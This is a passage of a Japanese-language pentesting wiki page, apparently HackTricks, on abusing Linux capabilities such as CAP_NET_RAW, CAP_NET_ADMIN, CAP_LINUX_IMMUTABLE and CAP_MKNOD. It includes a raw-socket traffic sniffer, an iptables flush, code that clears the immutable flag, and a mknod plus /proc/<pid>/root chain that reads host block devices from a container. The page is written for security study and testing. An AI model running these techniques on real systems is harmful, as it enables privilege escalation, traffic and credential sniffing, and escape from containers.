[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、プロセスによる **RAW および PACKET ソケットの作成**を許可し、任意のネットワークパケットを生成して送信できるようにします。これにより、コンテナ環境ではパケットの spoofing、トラフィックの注入、ネットワークアクセス制御の回避などのセキュリティリスクが生じる可能性があります。悪意のある攻撃者はこれを悪用して、コンテナのルーティングに干渉したり、特に適切なファイアウォール保護がない場合にホストのネットワークセキュリティを侵害したりする可能性があります。さらに、**CAP_NET_RAW** は RAW ICMP リクエストによる ping などの操作をサポートします。<sup>[[14]](#references)</sup>

**適切なソケットインターフェースがあれば、これによってパケットキャプチャが可能になります。** これによって、より広範な権限昇格が直接許可されるわけではありません。<sup>[[14]](#references)</sup>

認証情報の漏えい経路を確認するには、現在のアカウントで有効な capabilities を持つキャプチャツールを実行できること、対象のトラフィックがそのネットワーク namespace から見えるインターフェースを通過すること、認証情報が平文で送信されることも確認してください。たとえば、暗号化されていない HTTP 上の HTTP Basic 認証情報は、キャプチャツールが loopback インターフェースにアクセスできれば観測できます。別のアカウントへの切り替えには、取得した認証情報が別の ID で有効であることも必要です。ファイル capability があることやログインリクエストが見えることだけでは、パスワードの再利用は確認できません。

無線ホストでは、有効な `CAP_NET_RAW` を持つ `reaver` などの実行可能な WPS 監査ツールに加え、`iw dev` から見える AP と monitor-mode インターフェースがあれば、調査の手がかりになります。これは**実際に利用可能な権限昇格の証拠ではありません**。AP が有効なロックアウトなしで WPS PIN 認証を公開しており、無線インターフェースから到達でき、PSK を開示する必要があります。ホストの権限が変わるのは、その PSK がアカウントに再利用されている場合に限られます。パッシブな列挙では、プローブの送信や PIN の試行は行わず、インターフェースのモードと capabilities を報告してください。WPS PIN の脆弱性については [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755) を、ツールの動作については [Reaver's project documentation](https://github.com/shift/reaver-wps) を参照してください。

**バイナリの例**

バイナリ **`tcpdump`** にこの capability があれば、ネットワーク情報をキャプチャできます。

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

この**environment**がこのcapabilityを付与している場合、**`tcpdump`**もこれを使ってトラフィックをsniffできます。<sup>[[14]](#references)</sup>

**バイナリ2を使った例**

以下は、"**lo**"（**localhost**）インターフェースのトラフィックを傍受するのに役立つ**`python2`**コードの例です。このコードは、[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)のラボ「_The Basics: CAP-NET_BIND + NET_RAW_」からのものです。<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、現在の network namespace 内で、firewall の設定、routing table、socket の権限、network interface の設定など、**network configuration を変更する**権限を付与します。また、その namespace 内の interface を promiscuous mode にすることもできます。これにより、その interface に届く traffic が露出する可能性がありますが、それだけで他の network namespace にある任意の interface の sniffing が可能になるわけではありません。<sup>[[14]](#references)</sup>

これらの操作が影響するのは、プロセスの**現在の network namespace**です。ホストの network state を制御するには、`--network=host`、Kubernetes の `hostNetwork: true`、または別の namespace-entry primitive が必要です。`CAP_NET_RAW` だけでは汎用的な host shell にはなりませんが、文書化された protocol 固有の escape に関与した事例があります。過去の GCE chain では、root、ホストの network namespace、`CAP_NET_ADMIN`、`CAP_NET_RAW`、暗号化されていない metadata traffic、そして SSH key を注入するための raceable な guest-agent request が組み合わされていました。必要な前提条件と最新の HTTPS metadata に関する注意点については、[GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) を参照してください。

**binary の例**

**python binary** にこれらの capabilities があるとします。

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**この capability は、immutable や append-only などの inode フラグを変更できます。** これ自体が、より広範な privilege escalation を直接可能にするわけではありません。<sup>[[14]](#references)</sup>

**バイナリを使った例**

ファイルが immutable で、python にこの capability がある場合、**immutable 属性を削除してファイルを変更可能にできます:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

`FS_IOC_GETFLAGS`および`FS_IOC_SETFLAGS`操作はinodeフラグを読み取り、更新します。この例では`FS_IMMUTABLE_FL`（immutableフラグ）をクリアします。<sup>[[27]](#references)</sup>

> [!TIP]
> 通常、このimmutable属性の設定と解除には次の方法を使用します。
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は `chroot(2)` システムコールの実行を可能にし、既知の手法を使って、構成の不十分な `chroot(2)` jail から脱出できる場合があります。<sup>[[11]](#references)[[14]](#references)</sup>

これは **chroot-jail escape capability であり、単独でコンテナからホストへ脱出できる機能ではありません**。ホストのファイルシステムを公開するものでも、その権限を回避するものでもありません。ホストのルートがすでにマウントされているか、`/proc/<pid>/root` 経由で到達可能な場合、`chroot()` はその既存ツリーをプロセスのパス名ルートにするだけです。また、`setns(2)` による mount namespace の変更には、呼び出し元の user namespace における `CAP_SYS_CHROOT` と `CAP_SYS_ADMIN` の両方に加え、対象の mount namespace を所有する user namespace における `CAP_SYS_ADMIN` が必要です。<sup>[[14]](#references)</sup>

- [さまざまな chroot 環境から脱出する方法](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、`LINUX_REBOOT_CMD_RESTART2` などのコマンドを含む、システム再起動用の `reboot(2)` システムコールを実行できます。また、新しい crash kernel を読み込むための `kexec_load(2)` と、Linux 3.17 以降では署名済み crash kernel を読み込むための `kexec_file_load(2)` も使用可能にします。<sup>[[14]](#references)</sup>

プライベート PID namespace 内では、サポートされている `reboot()` リクエストはホストを再起動せず、その namespace の init プロセスを終了させます。そのため、ホストの再起動に影響を与えるには、通常はホストの PID を共有して、初期 PID namespace 内で実行する必要があります。kexec による乗っ取りには、互換性のあるイメージ、利用可能な syscall、制限の緩い lockdown および署名ポリシーも必要です。この capability を検証するだけの目的で、共有ホスト上でどちらの操作も実行しないでください:

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は Linux 2.6.37 で、より広範な **CAP_SYS_ADMIN** から分離され、`syslog(2)` 呼び出しを使用する権限を付与するものとして導入されました。この capability により、カーネルアドレスの公開を制御する `kptr_restrict` 設定が 1 の場合でも、`/proc` などのインターフェースを通じてカーネルアドレスを確認できます。Linux 2.6.39 以降、`kptr_restrict` のデフォルト値は 0 で、カーネルアドレスが公開されます。ただし、多くのディストリビューションでは、セキュリティ上の理由から 1（uid 0 以外にはアドレスを非表示）または 2（常にアドレスを非表示）に設定されています。<sup>[[14]](#references)</sup>

さらに、**CAP_SYSLOG** により、`dmesg_restrict` が 1 に設定されている場合でも `dmesg` の出力にアクセスできます。こうした変更があっても、歴史的な経緯から **CAP_SYS_ADMIN** は引き続き `syslog` 操作を実行できます。<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、`mknod` システムコールの機能を拡張し、通常のファイル、FIFO（名前付きパイプ）、UNIX ドメインソケット以外も作成できるようにします。具体的には、次の特殊ファイルを作成できます。<sup>[[14]](#references)</sup>

- **S_IFCHR**: 端末などのデバイスを表すキャラクタ型特殊ファイル。
- **S_IFBLK**: ディスクなどのデバイスを表すブロック型特殊ファイル。

この capability は、キャラクタデバイスやブロックデバイスなどのデバイスファイルを作成する必要があるプロセスに役立ちます。<sup>[[14]](#references)</sup>

Docker のドキュメントに記載されたデフォルトの capability セットに含まれています。すべてのデプロイで同じデフォルトが使われていると想定せず、実際のランタイム設定を確認してください（[Moby のデフォルト capability リスト](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。<sup>[[19]](#references)</sup>

コンテナエスケープでは、`CAP_MKNOD` を使って、実在するホストデバイスへの未作成のハンドルを作成できます。ただし、デバイスそのものを作成するわけではなく、デバイス cgroup の制限も回避できません。一連の操作を成立させるには、次の条件が必要です。

1. デバイスの作成は namespaced ではないため、初期 user namespace において `CAP_MKNOD` が有効であること。
2. 実在するホストデバイスに対応した、正しいブロック型またはキャラクタ型、および major/minor 番号。
3. デバイスを開くためのデバイス cgroup の許可。
4. ファイルシステムに対応した読み取り手段、またはブロックファイルシステムをマウントするための `CAP_SYS_ADMIN`。
5. ノードを作成して使用するための、ファイルシステムおよび LSM の権限。

実際の major/minor 番号が `252:1` である ext 系のラボ用ブロックデバイスでは、読み取り専用の検証は次のとおりです。

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

`/sys/class/block/<device>/dev` に報告されている値で番号を置き換えてください。ノードの作成には成功するものの、開くと `Operation not permitted` が返される場合、device cgroup が引き続きアクセスをブロックしています。これは、Docker のデフォルトの `CAP_MKNOD` があるだけで、デバイスへの明示的な許可がないコンテナで通常発生する結果です。

また、直接的なコンテナデバイスアクセスと混同してはならない、**2つの foothold を利用するローカル権限昇格**の手法もあります。初期 user namespace を共有するコンテナ内の root プロセスがブロックデバイスノードを作成し、ホスト上の、UID が一致する非特権シェルが `/proc/<container-pid>/root` 経由でそのノードを開きます。この場合、open はホストシェルの cgroup で評価されるため、コンテナの device cgroup による拒否ではデバイスを保護できなくなります。<sup>[[7]](#references)</sup>

コンテナ内でノードを作成し、既存のホスト側 foothold の UID でプロセスを実行したままにします:

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

その UID を持つ既存のホストシェルから、スリープ状態のコンテナプロセスのホスト PID を特定し、その procfs root をデバイスへのパスとして使用します：

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

この chain には、両方の foothold、identity-mapped または共有された user namespace、対象の `/proc/<pid>/root` をたどる権限、正しい major/minor number を持つ実デバイス、そして open を許可する外側の cgroup が必要です。`hidepid`、ptrace-access rules、LSM、filesystem の非互換性、または user-namespace remapping によって、この chain が破綻する場合があります。この歴史的な technique が重要なのは、`/proc/<pid>/root` によって *container の* device-cgroup 制限を回避できる仕組みを説明しているからです。`CAP_MKNOD` だけで通常どおり分離された container から escape できるという主張ではありません。<sup>[[7]](#references)</sup>

### CAP_SETPCAP

file capabilities を備えた現在の Linux kernel では、**`CAP_SETPCAP`** により、thread は bounding set の capability を inheritable set に追加し、bounding set から capability を削除し、securebits を変更できます。process が別の process に任意の capability を付与できるわけではありません。この動作が適用されるのは、file-capability support のない 2.6.25 より前の kernel に限られます。<sup>[[14]](#references)</sup>

`capset()` system call は、thread 自身の effective、permitted、inheritable set を調整できます。ただし、新しい permitted set に既存の permitted set 外の capability を含めることはできず、inheritable set の更新にも引き続き kernel の制約が適用されます。<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux capabilities の権限昇格 lab](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Linux の権限昇格](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux container の基礎: capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 入門](https://linux-audit.com/linux-capabilities-101/)
- [5] [Linux capabilities の活用](https://www.linuxjournal.com/article/5737)
- [6] [過剰な capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [/proc/pid/root を介した mount namespace へのアクセスの悪用](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux capabilities: 存在する理由と仕組み](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Linux の capabilities を理解する](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [ptrace が許可されている場合に seccomp を回避する PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [さまざまな chroot ソリューションから escape する方法](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Sebastian Krahmer による、元祖 CAP_DAC_READ_SEARCH Docker breakout exploit](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker breakout exploit の分析](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux マニュアルページ](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux マニュアルページ](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu マニュアルページ](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux マニュアルページ](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [container の実行 - Docker Docs](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker Docs](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux マニュアルページ](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux マニュアルページ](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux マニュアルページ](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
